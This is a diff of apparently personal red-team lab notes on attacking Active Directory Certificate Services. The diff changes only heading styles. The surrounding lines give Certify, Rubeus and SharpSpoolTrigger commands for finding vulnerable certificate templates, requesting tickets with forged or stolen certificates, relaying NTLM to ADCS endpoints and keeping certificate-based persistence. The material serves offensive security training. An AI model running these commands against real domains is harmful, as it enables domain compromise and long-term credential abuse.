@@ -1,6 +1,6 @@
 # ADCS Notes
 
-**Finding Certificate Authorities**
+## Finding Certificate Authorities
 
 Tools: [Certify](https://github.com/GhostPack/Certify)
 
@@ -9,7 +9,7 @@ Search ADCS in a domain or forest
 execute-assembly C:\Tools\Certify\Certify\bin\Release\Certify.exe cas
 ```
 
-**Misconfigured Certificate Templates**
+## Misconfigured Certificate Templates
 
 find vulnerable tickets
 ```
@@ -35,7 +35,7 @@ cat cert.pfx | base64 -w 0
 execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgt /user:<user> /certificate:<base64> /password:pass123 /nowrap
 ```
 
-**NTLM Relaying to ADCS HTTP Endpoints**
+## NTLM Relaying to ADCS HTTP Endpoints
 
 can't relay dc to adcs if running on same dc, but we can relay with a system having unconstrained delegation
 
@@ -61,7 +61,7 @@ on beacon:
 execute-assembly C:\Tools\SharpSystemTriggers\SharpSpoolTrigger\bin\Release\SharpSpoolTrigger.exe 10.10.122.30 10.10.123.102
 ```
 
-**User and Computer Persistence**
+## User and Computer Persistence
 
 Certs are great persistence since they default last a year regardless of password changes
 
@@ -89,7 +89,7 @@ if the user doesn't have a certificate we can just request one
 execute-assembly C:\Tools\Certify\Certify\bin\Release\Certify.exe request /ca:dc-2.dev.cyberbotic.io\sub-ca /template:User
 ```
 
-**Computer Persistence**
+## Computer Persistence
 
 we can do the same with computer accounts
 ```
